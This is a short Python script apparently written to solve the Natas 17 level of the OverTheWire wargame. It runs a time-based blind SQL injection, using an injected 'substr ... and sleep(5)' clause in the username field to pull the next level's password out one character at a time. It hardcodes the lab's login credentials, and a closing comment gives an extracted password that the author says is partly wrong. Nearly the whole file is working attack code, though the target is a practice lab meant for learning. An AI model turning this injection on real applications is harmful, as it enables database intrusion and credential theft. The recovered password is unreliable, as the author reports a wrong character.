import requests

lets = "abcdefghijklmnopqrstuvwxzyABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

passw=""
ctr=1
while True:
    passw_n = passw 
    for i in lets:
        dat = {"username":f"natas18\" and BINARY substr(password,{ctr},1) = \"{i}\" and sleep(5) #"}
        x = requests.post("http://natas17.natas.labs.overthewire.org/", dat, auth=("natas17","XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"))
        # print(x.text)
        if x.elapsed.total_seconds() >= 4:
            passw += i 
            ctr += 1
            print(passw)
            break
    if passw == passw_n: 
        break 

# we get 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6ao but ehhhh, its wrong
# Password has q in the end but gave o for some reason which was way frustrating